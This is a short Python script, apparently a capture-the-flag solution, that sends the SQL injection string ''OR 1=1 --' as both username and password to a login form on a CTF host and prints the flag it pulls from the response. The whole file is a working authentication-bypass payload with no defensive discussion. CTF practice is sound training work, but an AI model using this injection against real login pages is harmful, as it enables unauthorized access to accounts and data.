#!/usr/bin/python3

import re

import requests

url = "https://canyou.freedomctf.org/login"

r = requests.post(url, data={"username": "'OR 1=1 --", "password": "'OR 1=1 --"})

#print(r.text)
print(re.findall("flag{.*}", r.text)[0])